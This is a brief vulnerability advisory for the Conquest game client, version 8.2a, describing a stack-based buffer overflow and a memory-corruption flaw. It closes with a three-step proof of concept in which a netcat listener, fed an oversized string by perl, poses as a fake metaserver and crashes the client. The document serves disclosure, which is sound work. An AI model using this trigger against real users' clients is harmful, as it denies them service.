Conquest is prone to multiple remotely exploitable vulnerabilities, including a stack-based buffer-overflow vulnerability and a memory-corruption vulnerability.

An attacker can exploit these issues to execute arbitrary code within the context of the affected application or cause the affected application to crash, denying service to legitimate users.

These issues affect version 8.2a; prior versions may also be affected.

1. Launch a fake metaserver that sends more than 1024 chars:
perl -e 'print "a"x1200' | nc -l -p 1700 -v -v -n

2. Launch the client, specifying the alternate metaserver:
conquest -m -M 127.0.0.1

3. Interrupt the fake metaserver: conquest should have been crashed
